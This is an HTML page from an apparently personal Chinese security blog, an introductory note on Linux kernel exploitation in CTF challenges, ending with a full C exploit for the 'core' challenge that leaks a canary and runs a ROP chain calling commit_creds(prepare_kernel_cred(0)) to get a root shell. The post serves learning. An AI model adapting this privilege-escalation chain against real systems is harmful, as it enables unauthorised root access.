@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="koocola&#39;s blog" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>kernel pwn入门 | koocola&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="感谢大佬们在博客上的分享">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kernel pwn入门">
+<meta property="og:url" content="http://yoursite.com/2019/02/21/kernelpwn/index.html">
+<meta property="og:site_name" content="koocola&#39;s blog">
+<meta property="og:description" content="感谢大佬们在博客上的分享">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-02-21T08:39:32.409Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="kernel pwn入门">
+<meta name="twitter:description" content="感谢大佬们在博客上的分享">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+</head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="koocola&#39;s blog" rel="home">koocola&#39;s blog</a>
+      </h1>
+      
+        <h2 class="site-description">
+          <a href="/" id="subtitle">不要用战术上的勤奋掩饰战略上的懒惰</a>
+        </h2>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-kernelpwn" class="post-kernelpwn post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      kernel pwn入门
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/02/21/kernelpwn/" data-id="cjsedlkhv00092ctizdebg383" class="leave-reply bdsharebuttonbox" data-cmd="more"></a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>感谢大佬们在博客上的分享<br><a id="more"></a></p>
+<p><strong>qemu启动命令</strong></p>
+<p>-m megs set virtual RAM size to megs MB [default=128]<br>-kernel bzImage use ‘bzImage’ as kernel image<br>-initrd file use ‘file’ as initial ram disk<br>-append cmdline use ‘cmdline’ as kernel command line<br>-s shorthand for -gdb tcp::1234</p>
+<p><strong>—解包</strong><br>gunzip core.cpio.gz  #最好在新的文件夹下进行<br>cpio -idmv &lt; core.cpio</p>
+<p><strong>–去除定时关闭</strong></p>
+<p>vim init   删去poweroff</p>
+<p><strong>-重新打包</strong></p>
+<p>./gen_cpio.sh core.cpio<br>mv core.cpio ../core.cpio<br>cd ..<br>rm -rf core</p>
+<p><strong>–gcc编译</strong><br>gcc -Os -static exp.c -lutil -o exp</p>
+<p><strong>–重新打包cpio(使其包含exp)</strong><br>find . | cpio -o -H newc | gzip &gt; ../core.cpio</p>
+<p>ffffffff8969c8e0<br>ffffffff8969cce0<br>–leak基址方式<br>如果内核版本低，可以通过:  cat /tmp/kallsyms | grep commit_creds<br>                    cat /tmp/kallsyms | grep prepare_kernel_cred 来leak<br>内核版本高:<br>    方法一:和libc的pwn一样，如果知道一个函数的偏移和实际地址，基址=实际地址-偏移<br>    方法二:待补充</p>
+<p><strong>—内核提权的准备工作和返回用户态时的工作</strong><br>准备时：<br>static void save_state() {<br>    asm(<br>    “movq %%cs, %0\n”<br>    “movq %%ss, %1\n”<br>    “pushfq\n”<br>    “popq %2\n”<br>    : “=r” (user_cs), “=r” (user_ss), “=r” (user_rflags) : : “memory”);<br>}<br>即把cs,ss,rflags的值保存到我们前面声明的三个变量中去</p>
+<p><strong>返回时:</strong><br>1、swags  #  程序从内核态转换为用户态<br>2、itreq   #通过rsp处定义的结构体的方式恢复用户态的上下文<br>struct trap_frame{<br>    unsigned long long rip;<br>    unsigned long long cs;<br>    unsigned long long eflags;<br>    unsigned long long rsp;<br>    unsigned long long ss;<br>}<strong>attribute</strong>((packed));</p>
+<p>0xffffffff81000e40: pop rdi; ret;<br>0xffffffff8100d054: mov rdi, rax; call rdx;<br>0xffffffff810282f1:pop rdx; ret;<br>0xffffffff818012da: swapgs; popfq; ret;<br>0xffffffff81040a52: iretq; ret;</p>
+<p><strong>–提权方式:</strong><br>    方法一:     调用commit_creds(prepare_kernel_cred(0))   #即通过函数提权<br>        1、未开启smep:<br>        直接ret2user调用提权函数提权<br>        2、开启了smep:<br>        内核ROP(需要泄露基址)  （大文件寻找gadget用工具ROPPER比ROPgadget快十几倍(但缺点是虚拟机需要的内存太大了，至少要5个G，不然会卡死))</p>
+<p>方法二:修改cred提权<br>    1、<br>    直接从task_struct-&gt;real_cred开始写0x1c个0然后swags,iretq返回用户态起shell提权<br>    利用条件:<br>        有kernel任意地址写漏洞和task_struct的地址.<br>        通过前一个堆块堆溢出直接覆盖</p>
+<p><strong>–gdb调试:</strong><br>    set architecture i386:x86-64:intel<br>    如果遇到gdb挂载后出现remote too long g：<a href="https://www.cnblogs.com/chineseboy/p/4216521.html" target="_blank" rel="noopener">解决方法</a><br>    1、target remote localhost:port</p>
+<p>2、加载符号表<br>    grep 0 /sys/module/yourmodule/sections/.text   （需要root权限)<br>    add-symbol-file   directory    address<br>    之后可以直接对驱动的函数下断点</p>
+<p>3、获取 real_cred 的偏移<br>p &amp;((struct task_struct*)0)-&gt;real_cre</p>
+<p><strong>强网杯core：</strong>（感谢@veritas501 ，学习了很多)<br>exp:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_ss;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">	<span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">	<span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">	<span class="string">"pushfq\n"</span></span><br><span class="line">	<span class="string">"popq %2\n"</span></span><br><span class="line">	: <span class="string">"=r"</span> (tf.cs), <span class="string">"=r"</span> (tf.ss), <span class="string">"=r"</span> (tf.eflags) : : <span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">get_result</span><span class="params">(<span class="keyword">char</span> *s)</span>  <span class="comment">//get the result of system("command")</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">int</span> backfd;</span><br><span class="line">	pipe(fd);</span><br><span class="line">	backfd=dup(STDOUT_FILENO);</span><br><span class="line">	dup2(fd[<span class="number">1</span>],STDOUT_FILENO);</span><br><span class="line">	system(s);    </span><br><span class="line">	read(fd[<span class="number">0</span>],buf,<span class="number">1024</span>);</span><br><span class="line">	dup2(backfd,STDOUT_FILENO);</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> result;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"result: %s"</span>,buf);</span><br><span class="line">	result=strtoull(buf,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd=open(<span class="string">"/proc/core"</span>,O_RDWR);</span><br><span class="line">	<span class="keyword">char</span> ROP[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">char</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="keyword">void</span> *page = mmap(<span class="number">0</span>,<span class="number">0x500000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">	tf.rip=(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)shell;</span><br><span class="line">	tf.rsp=(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)(page+<span class="number">0x400000</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> canary;</span><br><span class="line">	<span class="comment">//get the function addr</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>  commit_creds;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> prepare_kernel_cred;</span><br><span class="line">	save_state();</span><br><span class="line">	commit_creds=get_result(<span class="string">"cat /tmp/kallsyms | grep commit_creds"</span>);</span><br><span class="line">	prepare_kernel_cred=get_result(<span class="string">"cat /tmp/kallsyms | grep prepare_kernel_cred"</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>  offset=commit_creds<span class="number">-0xffffffff8109c8e0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>,(<span class="keyword">void</span> *)offset);</span><br><span class="line">	<span class="comment">//get canary</span></span><br><span class="line">	ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889B</span>,temp);</span><br><span class="line">	canary=((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)temp)[<span class="number">0</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>,(<span class="keyword">void</span> *)canary);</span><br><span class="line">	<span class="comment">//create ROP</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)</span><br><span class="line">		ROP[i]=<span class="string">'a'</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>* pt=(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)&amp;ROP[<span class="number">64</span>];</span><br><span class="line">	<span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">	pt[j++]=canary;</span><br><span class="line">	pt[j++]=<span class="number">0</span>; <span class="comment">//rbp</span></span><br><span class="line">	pt[j++]=offset+<span class="number">0xffffffff81000b2f</span>; <span class="comment">//pop rdi ret;</span></span><br><span class="line">	pt[j++]=<span class="number">0</span>;</span><br><span class="line">	pt[j++]=prepare_kernel_cred;</span><br><span class="line">	pt[j++]=offset+<span class="number">0xffffffff810a0f49</span>;<span class="comment">//pop rdx; ret</span></span><br><span class="line">	pt[j++]=commit_creds;</span><br><span class="line">	pt[j++]=offset+ <span class="number">0xffffffff8106a6d2</span>;<span class="comment">//mov rdi, rax; jmp rdx;</span></span><br><span class="line">	pt[j++]=offset+<span class="number">0xffffffff81a012da</span>;<span class="comment">//swapgs; popfq; ret;</span></span><br><span class="line">	pt[j++]=<span class="number">0x10086</span>;</span><br><span class="line">	pt[j++]=offset+<span class="number">0xffffffff8135b7f9</span>; <span class="comment">//iret;</span></span><br><span class="line">	<span class="keyword">void</span> *str=&amp;pt[j];</span><br><span class="line">	<span class="built_in">memcpy</span>(str,(<span class="keyword">void</span> *)&amp;tf,<span class="keyword">sizeof</span>(tf));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%lu\n"</span>,<span class="keyword">sizeof</span>(tf));</span><br><span class="line">	write(fd,ROP,<span class="number">0x400</span>);</span><br><span class="line">	ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span>|(<span class="number">0x100</span>));	</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0xffffffff81000b2f; : pop rdi ; ret</span></span><br><span class="line"><span class="comment">0xffffffff8106a6d2;  mov rdi, rax ; jmp rdx</span></span><br><span class="line"><span class="comment">0xffffffff810a0f49; pop rdx; ret;</span></span><br><span class="line"><span class="comment">0xffffffff81a012da;//swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">0xffffffff8135b7f9; //iret;	</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>kernel pwn感觉ROP和libc的pwn也差不了多少，就是gdb调试起来十分的麻烦。</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2019/02/21/kernelpwn/">
+    <time datetime="2019-02-21T08:47:20.000Z" class="entry-date">
+        2019-02-21
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/2019/02/02/C++/" rel="next">通过C++的异常机制绕过canary <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2019/02/21/kernelpwn/">kernel pwn入门</a>
+          </li>
+        
+          <li>
+            <a href="/2019/02/02/C++/">通过C++的异常机制绕过canary</a>
+          </li>
+        
+          <li>
+            <a href="/2018/11/07/arm/">mips、arm  环境部署及调试</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/09/malloc/">malloc</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/06/SROP/">SROP</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2019 koocola
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
